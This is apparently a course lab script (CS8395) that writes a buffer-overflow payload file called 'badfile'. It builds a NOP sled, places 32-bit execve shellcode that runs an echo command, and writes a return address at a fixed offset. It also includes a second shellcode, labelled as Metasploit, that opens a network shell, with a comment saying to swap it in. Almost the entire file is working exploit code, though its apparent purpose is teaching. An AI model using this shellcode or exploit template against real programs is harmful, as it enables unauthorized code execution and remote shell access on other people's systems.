#!/usr/bin/python3
import sys

#####
## CS8395:  This shellcode contains 32-bit code that, when situated on the stack properly, will cause the program to run "echo 'Hello World'"
#####
shellcode = (
        '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x11\x00\x00\x00\x65\x63\x68\x6f\x20\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x00\x57\x53\x89\xe1\xcd\x80'
).encode('latin-1')

#####
## swap this out with shellcode on line 26 for reverse shell
#####
metasploitShellcode = (
        '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
).encode('latin-1')

# we create a crafted input file that is 512 bytes long

# First, we fill the content with NOP's
content = bytearray(0x90 for i in range(512)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 32               # Change this number (How far into the stack does this payload have to be to ensure it gets executed?) 
content[start:start + len(shellcode)] = shellcode


# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xFFFFD978      # Change this number    (where in the stack should the program jump to once it attempts to return from the vulnerable function?)
offset = 28               # Change this number    (how far into the stack does the return address need to go?)

# Use 4 for 32-bit address and 8 for 64-bit address (no need to change this)
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
